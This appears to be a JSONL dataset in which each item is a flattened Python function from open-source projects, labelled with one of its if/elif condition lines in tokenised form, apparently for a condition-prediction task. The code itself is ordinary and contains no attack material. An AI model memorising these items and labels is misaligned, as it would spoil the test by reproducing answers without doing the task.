{"input": "def calculate(self): \"\"\"Enumerate processes by scanning for _EPROCESS.\"\"\" result = set() psscan = self.session.plugins.psscan() pslist = self.session.plugins.pslist() for row in psscan.collect(): physical_eprocess = row[\"offset_p\"] if physical_eprocess.obj_vm == self.session.physical_address_space: eprocess = pslist.virtual_process_from_physical_offset(physical_eprocess) else: eprocess = physical_eprocess if eprocess != None: result.add(eprocess.obj_offset) self.session.logging.debug(\"Listed %s processes using PSScan\", len(result)) return result", "label": "if physical_eprocess . obj_vm == self . session . physical_address_space :"}
{"input": "def _build_kwargs_string(cls, expectation): kwargs = [] for k, v in expectation[\"kwargs\"].items(): if k == \"column\": # make the column a positional argument kwargs.insert(0, \"{}='{}'\".format(k, v)) elif isinstance(v, str): # Put strings in quotes kwargs.append(\"{}='{}'\".format(k, v)) else: # Pass other types as is kwargs.append(\"{}={}\".format(k, v)) return \", \".join(kwargs)", "label": "if k == \"column\" :"}
{"input": "def prec3_expr(self, arg_type): pass self.prec4_expr(arg_type) while True: if self.LA(1) == POWER: pass pass self.match(POWER) op = struct.pack(\"B\", ptgPower) self.prec4_expr(arg_type) self.rpn += op else: break", "label": "if self . LA ( 1 ) == POWER :"}
{"input": "def evaluate(analysis, rule): try: if isinstance(rule, MetaRule): result = _evaluate_meta_rule(analysis, rule) elif isinstance(rule, SingleRule): result = _evaluate_single_rule(analysis, rule) elif isinstance(rule, SubPathRule): result = _evaluate_sub_path_rule(analysis, rule) else: raise TypeError( \"rule must be of one in types [SingleRule, MetaRule, SubPathRule]\" ) return result except KeyError: # expected behavior as long as this does not have all other plugins as dependency return False", "label": "elif isinstance ( rule , SubPathRule ) :"}
{"input": "def create_log_file(d, logname): logpath = d.getVar(\"LOG_DIR\") bb.utils.mkdirhier(logpath) logfn, logsuffix = os.path.splitext(logname) logfile = os.path.join( logpath, \"%s.%s%s\" % (logfn, d.getVar(\"DATETIME\"), logsuffix) ) if not os.path.exists(logfile): slogfile = os.path.join(logpath, logname) if os.path.exists(slogfile): os.remove(slogfile) open(logfile, \"w+\").close() os.symlink(logfile, slogfile) d.setVar(\"LOG_FILE\", logfile) return logfile", "label": "if os . path . exists ( slogfile ) :"}
{"input": "def init_eventlog(self): \"\"\"Set up the event logging system.\"\"\" self.eventlog = EventLog(parent=self) for dirname, _, files in os.walk(os.path.join(here, \"event-schemas\")): for file in files: if not file.endswith(\".yaml\"): continue self.eventlog.register_schema_file(os.path.join(dirname, file))", "label": "if not file . endswith ( \".yaml\" ) :"}
{"input": "def resize(self, limit, force=False, ignore_errors=False, reset=False): prev_limit = self._limit if (self._dirty and 0 < limit < self._limit) and not ignore_errors: if not force: raise RuntimeError( \"Can't shrink pool when in use: was={0} now={1}\".format( self._limit, limit ) ) reset = True self._limit = limit if reset: try: self.force_close_all() except Exception: pass self.setup() if limit < prev_limit: self._shrink_down(collect=limit > 0)", "label": "if not force :"}
{"input": "def accept_request(self, request): if self.restriction_type == BaseViewRestriction.PASSWORD: passed_restrictions = request.session.get( self.passed_view_restrictions_session_key, [] ) if self.id not in passed_restrictions: return False elif self.restriction_type == BaseViewRestriction.LOGIN: if not request.user.is_authenticated: return False elif self.restriction_type == BaseViewRestriction.GROUPS: if not request.user.is_superuser: current_user_groups = request.user.groups.all() if not any(group in current_user_groups for group in self.groups.all()): return False return True", "label": "if not request . user . is_superuser :"}
{"input": "def getLatestXci(self, version=None): highest = None for nsp in self.getFiles(): try: if nsp.path.endswith(\".xci\"): if version is not None and nsp.version == version: return nsp if not highest or int(nsp.version) > int(highest.version): highest = nsp except BaseException: pass return highest", "label": "if not highest or int ( nsp . version ) > int ( highest . version ) :"}
{"input": "def evaluate(self, x, y, z): vertex = Vector((x, y, z)) nearest, normal, idx, distance = self.bvh.find_nearest(vertex) if self.use_normal: if self.signed_normal: sign = (v - nearest).dot(normal) sign = copysign(1, sign) else: sign = 1 return sign * np.array(normal) else: dv = np.array(nearest - vertex) if self.falloff is not None: norm = np.linalg.norm(dv) len = self.falloff(norm) dv = len * dv return dv else: return dv", "label": "if self . falloff is not None :"}
{"input": "def to_py(self, value: _StrUnset) -> _StrUnsetNone: self._basic_py_validation(value, str) if isinstance(value, usertypes.Unset): return value elif not value: return None value = os.path.expandvars(value) value = os.path.expanduser(value) try: if not os.path.isdir(value): raise configexc.ValidationError(value, \"must be a valid directory!\") if not os.path.isabs(value): raise configexc.ValidationError(value, \"must be an absolute path!\") except UnicodeEncodeError as e: raise configexc.ValidationError(value, e) return value", "label": "if not os . path . isabs ( value ) :"}
{"input": "def validate_load_balancer_sku(namespace): \"\"\"Validates the load balancer sku string.\"\"\" if namespace.load_balancer_sku is not None: if namespace.load_balancer_sku == \"\": return if ( namespace.load_balancer_sku.lower() != \"basic\" and namespace.load_balancer_sku.lower() != \"standard\" ): raise CLIError(\"--load-balancer-sku can only be standard or basic\")", "label": "if namespace . load_balancer_sku == \"\" :"}
{"input": "def _getLocalSpineType(self): if self._spineType is not None: return self._spineType else: for thisEvent in self.eventList: m1 = re.match(r\"\\*\\*(.*)\", thisEvent.contents) if m1: self._spineType = m1.group(1) return self._spineType return None", "label": "if m1 :"}
{"input": "def set_selected_device(self): current_devices = self.get_current_devices() if self.device in current_devices.values(): return for device_name in current_devices.values(): if self.device in device_name: self.parent.py3.log(f\"device {self.device} detected as {device_name}\") self.device = device_name break", "label": "if self . device in device_name :"}
{"input": "def write(self, buff): if not self.handle: raise TTransportException( type=TTransportException.NOT_OPEN, message=\"Transport not open\" ) sent = 0 have = len(buff) while sent < have: plus = self.handle.send(buff) if plus == 0: raise TTransportException( type=TTransportException.END_OF_FILE, message=\"TSocket sent 0 bytes\" ) sent += plus buff = buff[plus:]", "label": "if plus == 0 :"}
{"input": "def get_named_key_value(self, rule, match, key_name): # search the match for the key specified in the rule to get the value if key_name in rule: try: key_value = lookup_es_key(match, rule[key_name]) if key_value is not None: # Only do the unicode conversion if we actually found something) # otherwise we might transform None --> 'None' key_value = str(key_value) except KeyError: # Some matches may not have the specified key # use a special token for these key_value = \"_missing\" else: key_value = None return key_value", "label": "if key_value is not None :"}
{"input": "def __iter__(self): protocol = self.protocol source = write_source_from_arg(self.source) with source.open(\"wb\") as f: it = iter(self.table) hdr = next(it) if self.write_header: pickle.dump(hdr, f, protocol) yield tuple(hdr) for row in it: pickle.dump(row, f, protocol) yield tuple(row)", "label": "if self . write_header :"}
{"input": "def abs__file__(): \"\"\"Set all module' __file__ attribute to an absolute path\"\"\" for m in sys.modules.values(): if hasattr(m, \"__loader__\"): continue # don't mess with a PEP 302-supplied __file__ try: m.__file__ = os.path.abspath(m.__file__) except (AttributeError, OSError): pass", "label": "if hasattr ( m , \"__loader__\" ) :"}
{"input": "def _run(self): when_pressed = 0.0 pressed = False while not self._done.is_set(): now = time.monotonic() if now - when_pressed > self._debounce_time: if GPIO.input(self._channel) == self._expected: if not pressed: pressed = True when_pressed = now self._trigger(self._pressed_queue, self._pressed_callback) else: if pressed: pressed = False self._trigger(self._released_queue, self._released_callback) self._done.wait(0.05)", "label": "if pressed :"}
{"input": "def get_run_cmd(submission_dir): \"\"\"Get the language of a submission\"\"\" with CD(submission_dir): if os.path.exists(\"run.sh\"): with open(\"run.sh\") as f: for line in f: if line[0] != \"#\": return line.rstrip(\"\\r\\n\")", "label": "if line [ 0 ] != \"#\" :"}
{"input": "def client_read(self, path, **kwargs): \"\"\"Retrieve a value from a etcd key.\"\"\" try: res = self.client.read( path, timeout=kwargs.get(\"timeout\", DEFAULT_TIMEOUT), recursive=kwargs.get(\"recursive\") or kwargs.get(\"all\", False), ) if kwargs.get(\"watch\", False): modified_indices = (res.modifiedIndex,) + tuple( leaf.modifiedIndex for leaf in res.leaves ) return max(modified_indices) else: return res.value except EtcdKeyNotFound: raise KeyNotFound(\"The key %s was not found in etcd\" % path) except TimeoutError as e: raise e", "label": "if kwargs . get ( \"watch\" , False ) :"}
{"input": "def populate_wrapper(klass, wrapping): for meth, how in klass._wrap_methods.items(): if not hasattr(wrapping, meth): continue func = getattr(wrapping, meth) wrapper = make_wrapper(func, how) setattr(klass, meth, wrapper)", "label": "if not hasattr ( wrapping , meth ) :"}
{"input": "def _copy_files(self, files, src, dest, message=\"\"): for filepath in files: srcpath = os.path.join(src, filepath) destpath = os.path.join(dest, filepath) if message: print(\"{}: {}\".format(message, destpath)) if os.path.exists(srcpath): destdir = os.path.dirname(destpath) if not os.path.isdir(destdir): os.makedirs(destdir) shutil.copy(srcpath, destpath) elif os.path.exists(destpath): os.remove(destpath)", "label": "elif os . path . exists ( destpath ) :"}
{"input": "def scan_iter(self, match=None, count=None): nodes = await self.cluster_nodes() for node in nodes: if \"master\" in node[\"flags\"]: cursor = \"0\" while cursor != 0: pieces = [cursor] if match is not None: pieces.extend([\"MATCH\", match]) if count is not None: pieces.extend([\"COUNT\", count]) response = await self.execute_command_on_nodes([node], \"SCAN\", *pieces) cursor, data = list(response.values())[0] for item in data: yield item", "label": "if count is not None :"}
{"input": "def restart(cls, request, server_name): with cls._servername_to_shell_server_lock: if server_name in cls._servername_to_shell_server: servr = cls._servername_to_shell_server[server_name] servr.restart()", "label": "if server_name in cls . _servername_to_shell_server :"}
{"input": "def human_waiting_on(self): if self.waiting_on is None: return \"N/A\" things = [] for cluster, queue in self.waiting_on.items(): queue_length = len(queue) if queue_length == 0: continue elif queue_length == 1: things.append(f\"`{cluster}`: `{queue[0].get_instance()}`\") else: things.append(f\"`{cluster}`: {len(queue)} instances\") return \", \".join(things)", "label": "if queue_length == 0 :"}
{"input": "def psea(pname): \"\"\"Parse PSEA output file.\"\"\" fname = run_psea(pname) start = 0 ss = \"\" with open(fname) as fp: for l in fp: if l[0:6] == \">p-sea\": start = 1 continue if not start: continue if l[0] == \"\\n\": break ss = ss + l[0:-1] return ss", "label": "if not start :"}
{"input": "def encrypt_system_info_ssh_keys(ssh_info): for idx, user in enumerate(ssh_info): for field in [\"public_key\", \"private_key\", \"known_hosts\"]: if ssh_info[idx][field]: ssh_info[idx][field] = encryptor.enc(ssh_info[idx][field])", "label": "if ssh_info [ idx ] [ field ] :"}
{"input": "def get_shape(shape): \"\"\"Convert the shape to correct dtype and vars.\"\"\" ret = [] for dim in shape: if isinstance(dim, tvm.tir.IntImm): if libinfo()[\"INDEX_DEFAULT_I64\"] == \"ON\": ret.append(dim) else: val = int(dim) assert val <= np.iinfo(np.int32).max ret.append(tvm.tir.IntImm(\"int32\", val)) elif isinstance(dim, tvm.tir.Any): ret.append(te.var(\"any_dim\", \"int32\")) else: ret.append(dim) return ret", "label": "elif isinstance ( dim , tvm . tir . Any ) :"}
{"input": "def unpack(sources): temp_dir = tempfile.mkdtemp(\"-scratchdir\", \"unpacker-\") for package, content in sources.items(): filepath = package.split(\"/\") dirpath = os.sep.join(filepath[:-1]) packagedir = os.path.join(temp_dir, dirpath) if not os.path.isdir(packagedir): os.makedirs(packagedir) mod = open(os.path.join(packagedir, filepath[-1]), \"wb\") try: mod.write(base64.b64decode(content)) finally: mod.close() return temp_dir", "label": "if not os . path . isdir ( packagedir ) :"}
{"input": "def set_torrent_path(self, torrent_id, path): try: if not self.connect(): return False self.client.core.set_torrent_move_completed_path(torrent_id, path).get() self.client.core.set_torrent_move_completed(torrent_id, 1).get() except Exception: return False finally: if self.client: self.disconnect() return True", "label": "if self . client :"}
{"input": "def _get_specs(self, link, source, target): for src_spec, code in link.code.items(): src_specs = src_spec.split(\".\") if src_spec.startswith(\"event:\"): src_spec = (None, src_spec) elif len(src_specs) > 1: src_spec = (\".\".join(src_specs[:-1]), src_specs[-1]) else: src_prop = src_specs[0] if isinstance(source, Reactive): src_prop = source._rename.get(src_prop, src_prop) src_spec = (None, src_prop) return [(src_spec, (None, None), code)]", "label": "elif len ( src_specs ) > 1 :"}
{"input": "def deserialize(self, meth, content_type, body): meth_deserializers = getattr(meth, \"wsgi_deserializers\", {}) try: mtype = _MEDIA_TYPE_MAP.get(content_type, content_type) if mtype in meth_deserializers: deserializer = meth_deserializers[mtype] else: deserializer = self.default_deserializers[mtype] except (KeyError, TypeError): raise exception.InvalidContentType(content_type=content_type) return deserializer().deserialize(body)", "label": "if mtype in meth_deserializers :"}
{"input": "def object_inspect(self, oname, detail_level=0): \"\"\"Get object info about oname\"\"\" with self.builtin_trap: info = self._object_find(oname) if info.found: return self.inspector.info( info.obj, oname, info=info, detail_level=detail_level ) else: return oinspect.object_info(name=oname, found=False)", "label": "if info . found :"}
{"input": "def wrapper(*args, **kargs): for key, value in vkargs.items(): if key not in kargs: abort(403, \"Missing parameter: %s\" % key) try: kargs[key] = value(kargs[key]) except ValueError: abort(403, \"Wrong parameter format for: %s\" % key) return func(*args, **kargs)", "label": "if key not in kargs :"}
{"input": "def _append_fragment(self, ctx, frag_content): try: ctx[\"dest_stream\"].write(frag_content) ctx[\"dest_stream\"].flush() finally: if self.__do_ytdl_file(ctx): self._write_ytdl_file(ctx) if not self.params.get(\"keep_fragments\", False): os.remove(encodeFilename(ctx[\"fragment_filename_sanitized\"])) del ctx[\"fragment_filename_sanitized\"]", "label": "if not self . params . get ( \"keep_fragments\" , False ) :"}
{"input": "def override_args_required_option(argument_table, args, session, **kwargs): # This function overrides the 'required' property of an argument # if a value corresponding to that argument is present in the config # file # We don't want to override when user is viewing the help so that we # can show the required options correctly in the help need_to_override = False if len(args) == 1 and args[0] == \"help\" else True if need_to_override: parsed_configs = configutils.get_configs(session) for arg_name in argument_table.keys(): if arg_name.replace(\"-\", \"_\") in parsed_configs: argument_table[arg_name].required = False", "label": "if arg_name . replace ( \"-\" , \"_\" ) in parsed_configs :"}
{"input": "def _count(self, element, count=True): if not isinstance(element, six.string_types): if self == element: return 1 i = 0 for child in self.children: # child is text content and element is also text content, then # make a simple \"text\" in \"text\" if isinstance(child, six.string_types): if isinstance(element, six.string_types): if count: i += child.count(element) elif element in child: return 1 else: i += child._count(element, count=count) if not count and i: return i return i", "label": "elif element in child :"}
{"input": "def teardown_class(cls): collections = cls.discovery.list_collections(cls.environment_id).get_result()[ \"collections\" ] for collection in collections: if collection[\"name\"] == cls.collection_name: print(\"Deleting the temporary collection\") cls.discovery.delete_collection(cls.environment_id, cls.collection_id) break", "label": "if collection [ \"name\" ] == cls . collection_name :"}
{"input": "def _shares_in_results(data): shares_in_device, shares_in_subdevice = False, False for plugin_name, plugin_result in data.iteritems(): if plugin_result[\"status\"] == \"error\": continue if \"device\" not in plugin_result: continue if \"disk_shares\" in plugin_result[\"device\"]: shares_in_device = True for subdevice in plugin_result[\"device\"].get(\"subdevices\", []): if \"disk_shares\" in subdevice: shares_in_subdevice = True break return shares_in_device, shares_in_subdevice", "label": "if \"device\" not in plugin_result :"}
{"input": "def accept_request(self, request): if self.restriction_type == BaseViewRestriction.PASSWORD: passed_restrictions = request.session.get( self.passed_view_restrictions_session_key, [] ) if self.id not in passed_restrictions: return False elif self.restriction_type == BaseViewRestriction.LOGIN: if not request.user.is_authenticated: return False elif self.restriction_type == BaseViewRestriction.GROUPS: if not request.user.is_superuser: current_user_groups = request.user.groups.all() if not any(group in current_user_groups for group in self.groups.all()): return False return True", "label": "if self . id not in passed_restrictions :"}
{"input": "def __setitem__(self, index, item): try: start, stop, step = index.start, index.stop, index.step except AttributeError: index = operator.index(index) else: if len(self.lists) == 1: self.lists[0][index] = item else: tmp = list(self) tmp[index] = item self.lists[:] = [tmp] self._balance_list(0) return list_idx, rel_idx = self._translate_index(index) if list_idx is None: raise IndexError() self.lists[list_idx][rel_idx] = item", "label": "if len ( self . lists ) == 1 :"}
{"input": "def random_permutation_equality_groups(n_groups, n_perms_per_group, n_items, prob): fingerprints = set() for _ in range(n_groups): perms = random_equal_permutations(n_perms_per_group, n_items, prob) perm = perms[0] fingerprint = tuple(perm.get(i, i) for i in range(n_items)) if fingerprint not in fingerprints: yield perms fingerprints.add(fingerprint)", "label": "if fingerprint not in fingerprints :"}
{"input": "def get_proper_pip(): # no cov if not venv_active(): default_pip = os.environ.get(\"_DEFAULT_PIP_\", None) if default_pip: return default_pip elif not ON_WINDOWS: return \"pip3\" return \"pip\"", "label": "if default_pip :"}
{"input": "def close(self, checkcount=False): self.mutex.acquire() try: if checkcount: self.openers -= 1 if self.openers == 0: self.do_close() else: if self.openers > 0: self.do_close() self.openers = 0 finally: self.mutex.release()", "label": "if self . openers == 0 :"}
{"input": "def _lxml_default_loader(href, parse, encoding=None, parser=None): if parse == \"xml\": data = etree.parse(href, parser).getroot() else: if \"://\" in href: f = urlopen(href) else: f = open(href, \"rb\") data = f.read() f.close() if not encoding: encoding = \"utf-8\" data = data.decode(encoding) return data", "label": "if \"://\" in href :"}
{"input": "def Save(self): # Save the AUI perspectives if PersistenceManager allows it eventHandler = self._window.GetEventHandler() isAGWAui = isinstance(eventHandler, AUI.AuiManager) if not isAGWAui: return True if self._manager.GetManagerStyle() & PM_SAVE_RESTORE_AUI_PERSPECTIVES: # Allowed to save and restore perspectives perspective = eventHandler.SavePerspective() if isAGWAui: name = PERSIST_AGW_AUI_PERSPECTIVE else: name = PERSIST_AUI_PERSPECTIVE self._pObject.SaveValue(name, perspective) return True", "label": "if isAGWAui :"}
{"input": "def get_arg_list_scalar_arg_dtypes(arg_types): result = [] for arg_type in arg_types: if isinstance(arg_type, ScalarArg): result.append(arg_type.dtype) elif isinstance(arg_type, VectorArg): result.append(None) if arg_type.with_offset: result.append(np.int64) else: raise RuntimeError(\"arg type not understood: %s\" % type(arg_type)) return result", "label": "if arg_type . with_offset :"}
{"input": "def perform_secure_deletion_of_temporary_files(self): # Delete the outdated temp files if older than 1 day for f in os.listdir(self.state.settings.tmp_path): path = os.path.join(self.state.settings.tmp_path, f) timestamp = datetime.fromtimestamp(os.path.getmtime(path)) if is_expired(timestamp, days=1): overwrite_and_remove(path)", "label": "if is_expired ( timestamp , days = 1 ) :"}
{"input": "def set_torrent_ratio(self, torrent_ids, ratio): try: if not self.connect(): return False self.client.core.set_torrent_stop_at_ratio(torrent_ids, True).get() self.client.core.set_torrent_stop_ratio(torrent_ids, ratio).get() except Exception as err: return False finally: if self.client: self.disconnect() return True", "label": "if not self . connect ( ) :"}
{"input": "def value_to_db_datetime(self, value): if value is None: return None # MySQL doesn't support tz-aware datetimes if timezone.is_aware(value): if settings.USE_TZ: value = value.astimezone(timezone.utc).replace(tzinfo=None) else: raise ValueError( \"MySQL backend does not support timezone-aware datetimes when USE_TZ is False.\" ) # MySQL doesn't support microseconds return six.text_type(value.replace(microsecond=0))", "label": "if settings . USE_TZ :"}
{"input": "def remote_run_capture_all(login, cmd, log=None): \"\"\"Run the remote command and return the (retval, stdout, stderr) result.\"\"\" if sys.platform == \"win32\": if \"@\" not in login: login = \"%s@%s\" % (getpass.getuser(), login) cmd = 'plink -A -batch %s \"%s\"' % (login, cmd) else: cmd = 'ssh -A -o BatchMode=yes %s \"%s\"' % (login, cmd) __run_log(logstream, \"running '%s'\", cmd) p = subprocess.Popen(argv, stdout=subprocess.PIPE, stderr=subprocess.PIPE) stdout, stderr = p.communicate() status = p.returncode return status, stdout, stderr", "label": "if \"@\" not in login :"}
{"input": "def parseLeftHandSideExpressionAllowCall(): marker = None expr = None args = None property = None marker = createLocationMarker() expr = parseNewExpression() if matchKeyword(\"new\") else parsePrimaryExpression() while (match(\".\") or match(\"[\")) or match(\"(\"): if match(\"(\"): args = parseArguments() expr = delegate.createCallExpression(expr, args) elif match(\"[\"): property = parseComputedMember() expr = delegate.createMemberExpression(\"[\", expr, property) else: property = parseNonComputedMember() expr = delegate.createMemberExpression(\".\", expr, property) if marker: marker.end() marker.apply(expr) return expr", "label": "if match ( \"(\" ) :"}
{"input": "def getImageId(self, stuff): if not isinstance(stuff, Module): return -1 if stuff.charge is None: return -1 else: iconFile = stuff.charge.iconID if stuff.charge.iconID else \"\" if iconFile: return self.fittingView.imageList.GetImageIndex(iconFile, \"icons\") else: return -1", "label": "if iconFile :"}
{"input": "def instance_reader(): for epoch_index in range(epoch): if shuffle: if shuffle_seed is not None: np.random.seed(shuffle_seed) np.random.shuffle(examples) if phase == \"train\": self.current_train_epoch = epoch_index for (index, example) in enumerate(examples): if phase == \"train\": self.current_train_example = index + 1 feature = self.convert_example( index, example, self.get_labels(), self.max_seq_len, self.tokenizer ) instance = self.generate_instance(feature) yield instance", "label": "if phase == \"train\" :"}
{"input": "def i2h(self, pkt, x): if x is not None: if x < 0: warning(\"Fixed3_6: Internal value too negative: %d\" % x) x = 0 elif x > 999999999: warning(\"Fixed3_6: Internal value too positive: %d\" % x) x = 999999999 x = x * 1e-6 return x", "label": "if x < 0 :"}
{"input": "def _is_section_header(self) -> bool: section, underline = self._line_iter.peek(2) section = section.lower() if section in self._sections and isinstance(underline, str): return bool(_numpy_section_regex.match(underline)) elif self._directive_sections: if _directive_regex.match(section): for directive_section in self._directive_sections: if section.startswith(directive_section): return True return False", "label": "if _directive_regex . match ( section ) :"}
{"input": "def _parse_date_fmt(): fmt = get_format(\"DATE_FORMAT\") escaped = False for char in fmt: if escaped: escaped = False elif char == \"\\\\\": escaped = True elif char in \"Yy\": yield \"year\" elif char in \"bEFMmNn\": yield \"month\" elif char in \"dj\": yield \"day\"", "label": "elif char in \"dj\" :"}
{"input": "def _wait_port_open(port, max_wait=60): print(f\"Waiting for port {port}\") start = time.time() while True: try: socket.create_connection((\"localhost\", port), timeout=1) except OSError: if time.time() - start > max_wait: raise time.sleep(1) else: return", "label": "if time . time ( ) - start > max_wait :"}
{"input": "def _list(self): data_sources = self.mkt_contract.functions.getAllProviders().call() data = [] for index, data_source in enumerate(data_sources): if index > 0: if \"test\" not in Web3.toText(data_source).lower(): data.append(dict(dataset=self.to_text(data_source))) return pd.DataFrame(data)", "label": "if \"test\" not in Web3 . toText ( data_source ) . lower ( ) :"}
{"input": "def log_start(self, prefix, msg): with self._log_lock: if self._last_log_prefix != prefix: if self._last_log_prefix is not None: self._log_file.write(\"\\n\") self._log_file.write(prefix) self._log_file.write(msg) self._last_log_prefix = prefix", "label": "if self . _last_log_prefix is not None :"}
{"input": "def _split_string_to_tokens(text): \"\"\"Splits text to a list of string tokens.\"\"\" if not text: return [] ret = [] token_start = 0 # Classify each character in the input string is_alnum = [c in _ALPHANUMERIC_CHAR_SET for c in text] for pos in xrange(1, len(text)): if is_alnum[pos] != is_alnum[pos - 1]: token = text[token_start:pos] if token != u\" \" or token_start == 0: ret.append(token) token_start = pos final_token = text[token_start:] ret.append(final_token) return ret", "label": "if token != u\" \" or token_start == 0 :"}
{"input": "def _install_groups(self, grp_specs): try: self.base.env_group_install( grp_specs, tuple(self.base.conf.group_package_types), strict=self.base.conf.strict, ) except dnf.exceptions.Error: if self.base.conf.strict: raise", "label": "if self . base . conf . strict :"}
{"input": "def _idx2token(idxs): for idx in idxs: if idx < self.tgt_vocab_size: token = self.tgt_vocab([[idx]])[0][0] if token == self.eos_token: break yield token else: yield self.kb_keys[idx - self.tgt_vocab_size]", "label": "if token == self . eos_token :"}
{"input": "def increment(s): if not s: return \"1\" for sequence in string.digits, string.lowercase, string.uppercase: lastc = s[-1] if lastc in sequence: i = sequence.index(lastc) + 1 if i >= len(sequence): if len(s) == 1: s = sequence[0] * 2 if s == \"00\": s = \"10\" else: s = increment(s[:-1]) + sequence[0] else: s = s[:-1] + sequence[i] return s return s # Don't increment", "label": "if len ( s ) == 1 :"}
{"input": "def main(): import sys, getopt try: opts, args = getopt.getopt(sys.argv[1:], \"ho:\", [\"help\", \"output=\"]) except getopt.GetoptError as err: usage() sys.exit(1) output = None for o, a in opts: if o in (\"-h\", \"--help\"): usage() sys.exit() elif o in (\"-o\", \"--output\"): output = a else: usage() sys.exit(1) if not args: usage() sys.exit(1) concat_flv(args, output)", "label": "elif o in ( \"-o\" , \"--output\" ) :"}
{"input": "def binaryFindInDocument(): hi = len(self.headings) lo = 0 while lo < hi: mid = (lo + hi) // 2 h = self.headings[mid] if h.end_of_last_child < position: lo = mid + 1 elif h.start > position: hi = mid else: return binaryFindHeading(h)", "label": "if h . end_of_last_child < position :"}
{"input": "def on_key_press(self, *events): # The JS editor has already** handled the key! for ev in events: if self.should_be_leo_key(ev): ivar = \"minibufferWidget\" if self.name == \"minibuffer\" else self.name self.root.do_key(ev, ivar)", "label": "if self . should_be_leo_key ( ev ) :"}
{"input": "def _make_dataset(data_dir): data_dir = os.path.expanduser(data_dir) if not os.path.isdir(data_dir): raise (\"{} should be a dir\".format(data_dir)) images = [] for root, _, fnames in sorted(os.walk(data_dir, followlinks=True)): for fname in sorted(fnames): file_path = os.path.join(root, fname) if _is_valid_file(file_path): images.append(file_path) return images", "label": "if _is_valid_file ( file_path ) :"}
{"input": "def release(provider, connection, cache=None): if cache is not None: db_session = cache.db_session if db_session is not None and db_session.ddl and cache.saved_fk_state: try: cursor = connection.cursor() sql = \"SET foreign_key_checks = 1\" if core.local.debug: log_orm(sql) cursor.execute(sql) except: provider.pool.drop(connection) raise DBAPIProvider.release(provider, connection, cache)", "label": "if db_session is not None and db_session . ddl and cache . saved_fk_state :"}
{"input": "def get_pfunctions(self): p_functions = [] for name, item in self.pdict.items(): if name[:2] != \"p_\": continue if name == \"p_error\": continue if isinstance(item, (types.FunctionType, types.MethodType)): line = func_code(item).co_firstlineno file = func_code(item).co_filename p_functions.append((line, file, name, item.__doc__)) # Sort all of the actions by line number p_functions.sort() self.pfuncs = p_functions", "label": "if name == \"p_error\" :"}
{"input": "def get_output_sizes(self): sizes = [] output_paths = self.get_output_fnames() for outfile in [unicodify(o) for o in output_paths]: if os.path.exists(outfile): sizes.append((outfile, os.stat(outfile).st_size)) else: sizes.append((outfile, 0)) return sizes", "label": "if os . path . exists ( outfile ) :"}
{"input": "def normalize_crlf(tree): for elem in tree.getiterator(): if elem.text: elem.text = elem.text.replace(\"\\r\\n\", \"\\n\") if elem.tail: elem.tail = elem.tail.replace(\"\\r\\n\", \"\\n\")", "label": "if elem . text :"}
{"input": "def visit_decorator(self, o: Decorator) -> None: if self.is_private_name(o.func.name, o.func.fullname): return is_abstract = False for decorator in o.original_decorators: if isinstance(decorator, NameExpr): if self.process_name_expr_decorator(decorator, o): is_abstract = True elif isinstance(decorator, MemberExpr): if self.process_member_expr_decorator(decorator, o): is_abstract = True self.visit_func_def(o.func, is_abstract=is_abstract)", "label": "if isinstance ( decorator , NameExpr ) :"}
{"input": "def formatweekday(self, day, width): with TimeEncoding(self.locale) as encoding: if width >= 9: names = day_name else: names = day_abbr name = names[day] if encoding is not None: name = name.decode(encoding) return name[:width].center(width)", "label": "if width >= 9 :"}
{"input": "def autocommitter(): while True: try: if not self._running: break if self._auto_commit_enable: self._auto_commit() self._cluster.handler.sleep(self._auto_commit_interval_ms / 1000) except ReferenceError: break except Exception: # surface all exceptions to the main thread self._worker_exception = sys.exc_info() break log.debug(\"Autocommitter thread exiting\")", "label": "if not self . _running :"}
{"input": "def pseudo_raw_input(self, prompt): \"\"\"copied from cmd's cmdloop; like raw_input, but accounts for changed stdin, stdout\"\"\" if self.use_rawinput: try: line = raw_input(prompt) except EOFError: line = \"EOF\" else: self.stdout.write(prompt) self.stdout.flush() line = self.stdin.readline() if not len(line): line = \"EOF\" else: if line[-1] == \"\\n\": # this was always true in Cmd line = line[:-1] return line", "label": "if line [ - 1 ] == \"\\n\" :"}
{"input": "def get_suggestion(self, suggestion): if suggestion is None: return suggestion counter = 0 results = [] for feature in self._features: if feature in self._discrete_features: result, counter = self._get_discrete_suggestion( feature=feature, suggestion=suggestion, counter=counter ) results.append(result) elif feature in self._categorical_features: result, counter = self._get_categorical_suggestion( feature=feature, suggestion=suggestion, counter=counter ) results.append(result) else: results.append(suggestion[counter]) counter = counter + 1 return dict(zip(self._features, results))", "label": "elif feature in self . _categorical_features :"}
{"input": "def gen_raw_options(modelines): for m in modelines: opt = m.partition(\":\")[2].strip() if MULTIOPT_SEP in opt: for subopt in (s for s in opt.split(MULTIOPT_SEP)): yield subopt else: yield opt", "label": "if MULTIOPT_SEP in opt :"}
{"input": "def _parse_chunked(self, data): body = [] trailers = {} n = 0 lines = data.split(b\"\\r\\n\") # parse body while True: size, chunk = lines[n : n + 2] size = int(size, 16) if size == 0: n += 1 break self.assertEqual(size, len(chunk)) body.append(chunk) n += 2 # we /should/ hit the end chunk, but check against the size of # lines so we're not stuck in an infinite loop should we get # malformed data if n > len(lines): break return b\"\".join(body)", "label": "if n > len ( lines ) :"}
{"input": "def join(s, *p): path = s for t in p: if (not s) or isabs(t): path = t continue if t[:1] == \":\": t = t[1:] if \":\" not in path: path = \":\" + path if path[-1:] != \":\": path = path + \":\" path = path + t return path", "label": "if ( not s ) or isabs ( t ) :"}
{"input": "def validate_route_filter(cmd, namespace): from msrestazure.tools import is_valid_resource_id, resource_id if namespace.route_filter: if not is_valid_resource_id(namespace.route_filter): namespace.route_filter = resource_id( subscription=get_subscription_id(cmd.cli_ctx), resource_group=namespace.resource_group_name, namespace=\"Microsoft.Network\", type=\"routeFilters\", name=namespace.route_filter, )", "label": "if not is_valid_resource_id ( namespace . route_filter ) :"}
{"input": "def expanded_output(self): \"\"\"Iterate over output files while dynamic output is expanded.\"\"\" for f, f_ in zip(self.output, self.rule.output): if f in self.dynamic_output: expansion = self.expand_dynamic(f_) if not expansion: yield f_ for f, _ in expansion: file_to_yield = IOFile(f, self.rule) file_to_yield.clone_flags(f_) yield file_to_yield else: yield f", "label": "if not expansion :"}
